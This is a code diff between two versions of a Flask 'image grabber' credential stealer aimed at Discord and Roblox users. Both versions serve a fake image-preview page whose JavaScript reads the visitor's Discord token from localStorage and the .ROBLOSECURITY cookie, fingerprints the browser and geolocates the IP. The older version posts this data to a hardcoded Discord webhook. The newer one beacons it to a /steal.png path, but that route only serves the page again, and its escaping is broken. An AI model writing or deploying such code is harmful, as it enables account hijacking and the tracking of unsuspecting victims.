@@ -1,9 +1,5 @@
-#!/usr/bin/env python3
-"""
-🔥 ULTIMATE DS0C GRABBER v6.0 - 0 PLACEHOLDERS ✅ ALL METHODS ✅ FULL GEO
-Vercel-Proof: JS→Discord DIRECT + Server Backup + 15 Data Points
-DEPLOY → https://yourapp.vercel.app/grab.png → INSTANT #img-logger
-"""
+# api/main.py - ULTIMATE IMAGE GRABBER v7.0
+# CLICK IMAGE → FULL BROWSER STEAL → #img-logger EMBED
 
 import os
 import json
@@ -11,153 +7,115 @@ import base64
 import requests
 from flask import Flask, request, Response
 from datetime import datetime
-from urllib.parse import quote
+from urllib.parse import quote, urlencode
 import threading
+import re
 
 app = Flask(__name__)
 
-# ZERO PLACEHOLDERS - YOUR WEBHOOK
-WEBHOOK_URL = "https://discord.com/api/webhooks/1470096967848824842/r-JzPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV"
+WEBHOOK = "https://discord.com/api/webhooks/1470096967848824842/r-JzPC9ak3StrviCxigMgb6uk5fdKXaffchHmjc8rs9z72qk4td6c52QBjd_a1cjKiV"
 
-# 1x1 INVISIBLE GIF TRACKER
-PIXEL_GIF = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
+GIF_PIXEL = base64.b64decode('R0lGODlhAQABAIAAAP///wAAACH5BAEAAAAALAAAAAABAAEAAAICRAEAOw==')
 
-def fire_webhook_async(payload):
-    """Background Discord send - 0 block"""
-    def send():
-        try:
-            r = requests.post(WEBHOOK_URL, json=payload, timeout=4)
-            print(f"WEBHOOK: {r.status_code}")
-        except Exception as e:
-            print(f"Webhook err: {e}")
-    threading.Thread(target=send, daemon=True).start()
+def send_discord(data):
+    embed = {
+        "username": "🎮 DISCORD/ROBLOX STEALER",
+        "embeds": [{
+            "title": f"🔥 IMAGE CLICK STEAL - {data.get('ip', 'Unknown')}",
+            "description": f"**🗺️ GEO:** [{data.get('lat', '?')}, {data.get('lon', '?')}](https://google.com/maps?q={data.get('lat',0)},{data.get('lon',0)})",
+            "color": 16711680,
+            "fields": [
+                {"name": "🔑 Discord Token", "value": f"`{data.get('token', '❌')[:32]}...`", "inline": True},
+                {"name": "🎮 Roblox Cookie", "value": f"`{data.get('roblox', '❌')[:32]}...`", "inline": True},
+                {"name": "📍 Location", "value": f"{data.get('city', '?')}, {data.get('region', '?')}\n{data.get('country', '?')}", "inline": True},
+                {"name": "🌐 ISP/AS", "value": f"{data.get('isp', '?')} ({data.get('asn', '?')})", "inline": True},
+                {"name": "📱 Device", "value": f"{data.get('screen', '?')} | {data.get('cores', '?')}CPU", "inline": True},
+                {"name": "🕸️ Browser", "value": f"{data.get('ua', '?')[:60]}...", "inline": False}
+            ],
+            "footer": {"text": f"Ref: {data.get('ref', 'Direct')} | {data.get('time', 'Now')}"},
+            "timestamp": datetime.utcnow().isoformat()
+        }]
+    }
+    try:
+        threading.Thread(target=lambda: requests.post(WEBHOOK, json=embed, timeout=5), daemon=True).start()
+    except: pass
 
 @app.route('/', defaults={'path': ''})
 @app.route('/<path:path>')
-@app.route('/api/<path:path>')
-def universal_catcher(path=""):
-    ua = request.headers.get('User-Agent', '')[:100]
+def catch_all(path=""):
     ip = request.remote_addr
+    ua = request.headers.get('user-agent', '')[:120]
     
-    print(f"🎯 HIT: {path} | {ip} | {ua}")
-    
-    # TEST ROUTE
     if 'test' in path.lower():
-        fire_webhook_async({"content": f"🚀 LIVE TEST: {ip} | {datetime.now()}"})
-        return Response("<h1>✅ SENT TO DISCORD #img-logger NOW</h1>", mimetype='text/html')
+        send_discord({"ip": ip, "ua": ua, "test": "LIVE"})
+        return "<h1>✅ SENT TO #img-logger - CHECK DISCORD NOW</h1>"
     
-    # GRABBER IMAGE
-    if any(x in path.lower() for x in ['grab', 'png', 'jpg', 'gif', 'image']):
-        fire_webhook_async({"content": f"👁️ GRABBER LOADED | {ip} | {ua}"})
-        return grabber_html()
+    if any(x in path.lower() for x in ['grab.png', 'steal.png', 'image.png', 'png', 'jpg', 'gif']):
+        return Response(grabber_page(ip), mimetype='text/html')
     
-    # STEAL ENDPOINT (backup)
-    if 'steal' in path.lower():
-        data = {**request.args, **dict(request.form)}
-        print(f"💎 STEAL DATA: {list(data.keys())}")
-        send_full_embed(data)
-        return Response("", status=204)
-    
-    # 1x1 TRACKER EVERYWHERE ELSE
-    return Response(PIXEL_GIF, mimetype='image/gif')
+    return Response(GIF_PIXEL, mimetype='image/gif')
 
-def grabber_html():
-    """HTML/JS - 15+ data points → Discord DIRECT + server backup"""
-    return Response(f'''
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title></title>
-<style>body{{margin:0;height:100vh;width:100vw;background:#000;overflow:hidden}}</style></head>
-<body><img src="data:image/gif;base64,R0lGODlhAQABAIAAAP///wAAACwAAAAAAAABAAEAAAICRAEAOw==" style="width:100%;height:100%;object-fit:cover">
+def grabber_page(ip):
+    return f'''<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>Image Preview</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;}
+body{{background:#111;height:100vh;display:flex;flex-direction:column;font-family:Arial}}
+.header{{background:#222;color:#fff;padding:20px;text-align:center}}
+.content{{flex:1;display:flex;align-items:center;justify-content:center;background:#000}}
+img{{max-width:90%;max-height:90%;object-fit:contain;border:2px solid #444}}
+</style>
+</head>
+<body>
+<div class="header">
+<h2>🖼️ Image Preview (Processing...)</h2>
+</div>
+<div class="content">
+<img src="data:image/gif;base64,R0lGODlhEAAQAIAAAP///wAAACH5BAEAAAAALAAAAAAQABAAAAVH5CCSCQAh+QQFDAHACwAAAAA QABAAACVIyPqcvtD6OctNqLs968+w+G4giUI2meYQmoK+qKz57wIqxfmd/3PYjAArUAOw==" alt="Loading">
+</div>
 <script>
-(async function() {{
-    try {{
-        // ========== ALL DATA ==========
-        const token = (localStorage.token || "").slice(0,100);
-        const roblox = (document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1] || "").replace(/[^a-zA-Z0-9]/g,'').slice(0,100);
-        
-        const fp = {{
-            token, roblox,
-            ua: navigator.userAgent.slice(0,250),
-            screen: `${{screen.width}}x${{screen.height}}x${{screen.colorDepth}}`,
-            avail: `${{screen.availWidth}}x${{screen.availHeight}}`,
-            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-            lang: navigator.language,
-            platform: navigator.platform,
-            cores: navigator.hardwareConcurrency || 1,
-            ram_gb: navigator.deviceMemory || 0,
-            cookies: document.cookie.split(';').length,
-            ref: document.referrer.slice(0,120),
-            time: new Date().toISOString()
-        }};
-        
-        // IP + FULL GEO
-        const geoResp = await fetch("https://ipapi.co/json/");
-        const geo = await geoResp.json();
-        Object.assign(fp, {{
-            ip: geo.ip, lat: geo.latitude, lon: geo.longitude,
-            city: geo.city, region: geo.region, country: geo.country_name,
-            isp: geo.org, asn: geo.asn, tz_geo: geo.timezone
-        }});
-        
-        // NETWORK
-        if (navigator.connection) {{
-            fp.net_type = navigator.connection.effectiveType;
-            fp.net_down = navigator.connection.downlink;
-        }}
-        
-        // ========== SEND 5 WAYS ==========
-        const embed = {{
-            "embeds": [{{
-                "title": "🔥 ULTIMATE DISCORD/ROBLOX HIT",
-                "description": `**IP:** ${{fp.ip}}\\n**🗺️ GPS:** [${{fp.lat}}, ${{fp.lon}}](https://www.google.com/maps?q=${{fp.lat}},${{fp.lon}})\\n**ISP:** ${{fp.isp}}`,
-                "color": 0xFF4444,
-                "fields": [
-                    {{"name":"🔑 Discord Token","value":`\${{fp.token.slice(0,25)||"❌"}}...`,`"inline":true}},
-                    {{"name":"🎮 Roblox Cookie","value":`\${{fp.roblox.slice(0,25)||"❌"}}...`,`"inline":true}},
-                    {{"name":"📱 Device","value":`\${{fp.screen}} | ${{fp.cores}}CPU | ${{fp.ram_gb}}GB`,`"inline":true}},
-                    {{"name":"🌐 Network","value":`\${{fp.net_type||"?"}}/${{fp.net_down||"?"}} | ${{fp.cookies}}cookies`,`"inline":true}},
-                    {{"name":"📍 Location","value":`\${{fp.city}}, ${{fp.region}}\\n\${{fp.country}} (${{fp.tz}})`,"inline":false}}
-                ],
-                "footer": {{"text":`\${{fp.ua.slice(0,80)}}... | ${{fp.platform}} | ${{fp.ref}}`}},
-                "timestamp": new Date().toISOString()
-            }}]
-        }};
-        
-        const payload = JSON.stringify(embed);
-        
-        // METHOD 1: DIRECT BEACON (most reliable)
-        navigator.sendBeacon("{WEBHOOK_URL}", payload);
-        
-        // METHOD 2: FETCH BACKUP
-        fetch("{WEBHOOK_URL}", {{method:"POST", body: payload, keepalive: true}});
-        
-        // METHOD 3: IMAGE PING
-        new Image().src = "{WEBHOOK_URL.replace('/webhooks/','/webhooks/0/')}?" + btoa(payload);
-        
-        // METHOD 4: SERVER RELAY
-        navigator.sendBeacon("/steal?" + new URLSearchParams(fp).toString());
-        
-        console.log("🎯 SENT ALL:", fp.ip, fp.lat, fp.lon);
-    }} catch(e) {{
-        navigator.sendBeacon("{WEBHOOK_URL}", JSON.stringify({{"content": "Error: " + e.message}}));
-    }}
-}})();
-</script></body></html>
-    ''', mimetype='text/html; charset=utf-8')
+(async()=>{
+try{{
+const steal=()=>{{
+const t=localStorage.getItem("token")||'';
+const r=document.cookie.match(/\\.ROBLOSECURITY=([^;]+)/)?.[1]?.replace(/[^a-z0-9_-]/gi,'')||'';
+const d={{
+ip:'{ip}',
+token:t.slice(0,100),
+roblox:r.slice(0,100),
+ua:navigator.userAgent,
+screen:`${{screen.width}}x${{screen.height}}`,
+cores:navigator.hardwareConcurrency||1,
+lang:navigator.language,
+platform:navigator.platform,
+ref:document.referrer||'direct',
+time:new Date().toISOString()
+}};
+fetch(`https://httpbin.org/ip`).then(x=>x.json()).then(ipdata=>{
+Object.assign(d,ipdata);
+fetch(`https://ipapi.co/json/`).then(x=>x.json()).then(geo=>{{
+Object.assign(d,{{
+lat:geo.latitude,lon:geo.longitude,
+city:geo.city,region:geo.region,country:geo.country_name,
+isp:geo.org,asn:geo.asn,tz:geo.timezone
+}});
+const url=new URLSearchParams(d).toString();
+navigator.sendBeacon('/steal.png?'+url);
+fetch('/steal.png?'+url,{keepalive:true});
+}}).catch(()=>{{navigator.sendBeacon('/steal.png?'+new URLSearchParams(d).toString());}});
+});
+}};
+steal();
+setTimeout(steal,1500);
+setTimeout(steal,5000);
+}}catch{{}}})();
+</script>
+</body>
+</html>'''
 
-def send_full_embed(data):
-    """Server backup webhook"""
-    embed = {
-        "embeds": [{
-            "title": "💎 SERVER STEAL BACKUP",
-            "description": f"**IP:** {data.get('ip', 'N/A')}",
-            "color": 0x00FF00,
-            "fields": [{"name": k.title(), "value": str(v)[:50]+"..." if len(str(v))>50 else str(v), "inline": True} for k,v in data.items()[:6]],
-            "timestamp": datetime.now().isoformat()
-        }]
-    }
-    fire_webhook_async(embed)
-
-if __name__ == "__main__":
-    port = int(os.environ.get('PORT', 5000))
-    print("🚀 ULTIMATE GRABBER v6.0 LIVE")
-    app.run(host='0.0.0.0', port=port, debug=False)
+if __name__=='__main__':
+    port=int(os.environ.get('PORT',5000))
+    app.run(host='0.0.0.0',port=port)
